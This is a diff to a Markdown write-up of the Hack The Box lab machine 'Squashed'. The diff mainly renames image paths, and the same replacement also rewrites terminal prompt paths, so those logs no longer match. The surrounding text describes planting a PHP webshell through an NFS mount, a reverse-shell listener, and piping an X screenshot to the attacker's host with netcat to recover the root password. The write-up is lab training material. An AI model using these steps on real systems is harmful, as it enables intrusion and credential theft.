@@ -71,7 +71,7 @@ nnveA8vUz0D7ug5n04A=
 
 Accessing the website on port 80, we got.
 
-![Untitled](Squashed/Untitled.png)
+![Untitled](images/Untitled.png)
 
 We execute a brute-force directory attack on the / end point but we found nothing interesting.
 
@@ -227,13 +227,13 @@ We write a html test file in web root and tried to access it on our browser.
 └──╼ $echo 'th3g3ntl3m4n' > /mnt/th3g3ntl3m4n.html
 ```
 
-![Untitled](Squashed/Untitled%201.png)
+![Untitled](images/Untitled%201.png)
 
 Now, we write down our php webshell on this web root directory, because reading the `.htaccess` file we could see this web server runs php.
 
-![Untitled](Squashed/Untitled%202.png)
+![Untitled](images/Untitled%202.png)
 
-![Untitled](Squashed/Untitled%203.png)
+![Untitled](images/Untitled%203.png)
 
 ```bash
 ┌─[test@parrot]─[/home/th3g3ntl3m4n/htb/machines/squashed]
@@ -251,11 +251,11 @@ drwxr-xr-x 2 test www-data  4096 mai 22 22:15 js
 
 Accessing our webshell we got.
 
-![Untitled](Squashed/Untitled%204.png)
+![Untitled](images/Untitled%204.png)
 
 We send our payload on our web shell.
 
-![Untitled](Squashed/Untitled%205.png)
+![Untitled](images/Untitled%205.png)
 
 And check our listener.
 
@@ -395,7 +395,7 @@ In order to be successful of it, we upload the `.Xauthority` file from our mount
 ─[us-free-3]─[10.10.14.158]─[th3g3ntl3m4n@parrot]─[~/htb/machines/squashed]
 └──╼ [★]$ cd mnt_ross/
 
-─[us-free-3]─[10.10.14.158]─[th3g3ntl3m4n@parrot]─[~/htb/machines/squashed/mnt_ross]
+─[us-free-3]─[10.10.14.158]─[th3g3ntl3m4n@parrot]─[~/htb/machines/images/mnt_ross]
 └──╼ [★]$ ls -la
 total 64
 drwxr-xr-x 14         1001 scanner      4096 mai 23 01:46 .
@@ -421,20 +421,20 @@ lrwxrwxrwx  1 root         root            9 out 21  2022 .viminfo -> /dev/null
 
 Now we up a python http server on the directory mounted and downloaded the file from the target host.
 
-![Untitled](Squashed/Untitled%206.png)
+![Untitled](images/Untitled%206.png)
 
 We couldn't enumerate through the commands even passing the `.Xauhtority` file. So we try to take a screenshot from Desktop of user ross. Note that on `/tmp` directory there is some kpass files that could be helpful to us.
 
-![Untitled](Squashed/Untitled%207.png)
+![Untitled](images/Untitled%207.png)
 
 Checking the file we downloaded from out mount partition, we couldn't download it, so we create a new user on our local machine called hacker and change his uid and gid.
 
 ```bash
-─[us-free-3]─[10.10.14.158]─[th3g3ntl3m4n@parrot]─[~/htb/machines/squashed/mnt_ross]
+─[us-free-3]─[10.10.14.158]─[th3g3ntl3m4n@parrot]─[~/htb/machines/images/mnt_ross]
 └──╼ [★]$ sudo usermod -g 1001 hacker
-─[us-free-3]─[10.10.14.158]─[th3g3ntl3m4n@parrot]─[~/htb/machines/squashed/mnt_ross]
+─[us-free-3]─[10.10.14.158]─[th3g3ntl3m4n@parrot]─[~/htb/machines/images/mnt_ross]
 └──╼ [★]$ sudo usermod -u 1001 hacker
-─[us-free-3]─[10.10.14.158]─[th3g3ntl3m4n@parrot]─[~/htb/machines/squashed/mnt_ross]
+─[us-free-3]─[10.10.14.158]─[th3g3ntl3m4n@parrot]─[~/htb/machines/images/mnt_ross]
 └──╼ [★]$ cat /etc/passwd | grep hacker
 hacker:x:1001:1001::/home/hacker:/bin/sh
 ```
@@ -477,22 +477,22 @@ Now we exfiltrate this screenshot file using netcat. We opened a flow on our att
 alex@squashed:~$ cat /tmp/th3g3ntl3m4n.xwd | nc 10.10.14.158 8888
 ```
 
-![Untitled](Squashed/Untitled%208.png)
+![Untitled](images/Untitled%208.png)
 
 Now, we use the command display, we were able to open the screenshot file and get the root password.
 
 ```bash
-─[us-free-3]─[10.10.14.158]─[th3g3ntl3m4n@parrot]─[~/htb/machines/squashed/exploitation/privesc]
+─[us-free-3]─[10.10.14.158]─[th3g3ntl3m4n@parrot]─[~/htb/machines/images/exploitation/privesc]
 └──╼ [★]$ ls -la
 total 1880
 drwxr-xr-x 1 th3g3ntl3m4n th3g3ntl3m4n      28 mai 23 10:28 .
 drwxr-xr-x 1 th3g3ntl3m4n th3g3ntl3m4n      14 mai 22 16:29 ..
 -rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n 1923179 mai 23 10:28 screenshot.xwd
-─[us-free-3]─[10.10.14.158]─[th3g3ntl3m4n@parrot]─[~/htb/machines/squashed/exploitation/privesc]
+─[us-free-3]─[10.10.14.158]─[th3g3ntl3m4n@parrot]─[~/htb/machines/images/exploitation/privesc]
 └──╼ [★]$ display screenshot.xwd
 ```
 
-![Untitled](Squashed/Untitled%209.png)
+![Untitled](images/Untitled%209.png)
 
 Now we log into the system as user root.
 
